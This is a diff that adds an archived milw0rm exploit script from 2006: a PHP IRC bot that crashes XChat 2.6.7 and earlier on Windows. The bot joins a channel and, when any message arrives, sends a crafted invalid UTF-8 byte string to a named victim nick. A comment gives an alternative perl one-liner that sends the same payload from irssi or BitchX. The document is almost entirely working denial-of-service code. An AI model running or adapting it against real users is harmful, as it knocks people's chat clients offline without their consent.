@@ -1,0 +1,44 @@
+<?
+ # another way to test this with irssi/bitchx <below> /str0ke
+ # /exec -o perl -e 'print "\x9x\xF0\x92\x8D\x85\xF1\xA5\x90\xB4\xF1\x96\x9E\x85\xF1\xA6\x8D\xA5\xF1\xB8\xA5\x85\xF1\xA7\x95\xA8\x29\xF2\x95\x95\x82"'
+ ?>
+
+<?php
+// XChat <= 2.6.7 Windows Remote Crash DoS by ratboy
+// Tested on Windows SP1/SP2          
+// The following bug was tested on the XChat <= 2.6.7 on Windows SP1/SP2  
+
+//Stop the script timing out
+set_time_limit(0);
+
+//Set constants
+define("SERVER", 'irc.enigmagroup.org');
+define("PORT", 6667);
+define("CHANNEL", "#enigmagroup");  //Set the channel the bot will join here
+define("NICK", "ratbot");    //Set the bot's nick here
+define("EXPLOIT", "\x9x\xF0\x92\x8D\x85\xF1\xA5\x90\xB4\xF1\x96\x9E\x85\xF1\xA6\x8D\xA5\xF1\xB8\xA5\x85\xF1\xA7\x95\xA8\x29\xF2\x95\x95\x82");
+define("VICTIM", "ratboy");
+
+$socket = socket_create(AF_INET,SOCK_STREAM,SOL_TCP); // Create the Socket
+$fp = socket_connect($socket, SERVER, PORT); // Connect to the server
+socket_write($socket,"USER ratboy ratboy ratboy :ratboy\r\n"); // Send the Username to the server
+socket_write($socket,"NICK ".NICK." \r\n"); // Change our nickname
+socket_write($socket,"JOIN ".CHANNEL." \r\n"); // Join the channel
+while($data = @socket_read($socket,2046)) { //read the data
+    echo $data;
+    $cmd = explode(" ", $data);
+
+    if (strpos($data, "PING :")===0) {
+        socket_write($socket, "PONG :".substr($data, 6)."\r\n");
+        continue;
+    }
+    
+    if($cmd[1] == "PRIVMSG"){  // Send the exploit right when the channel gets a message then stop the bot
+        socket_write($socket, "PRIVMSG ".VICTIM." :".EXPLOIT."\r\n");
+        socket_close($socket);
+    }
+}
+
+?> 
+
+# milw0rm.com [2006-08-07]
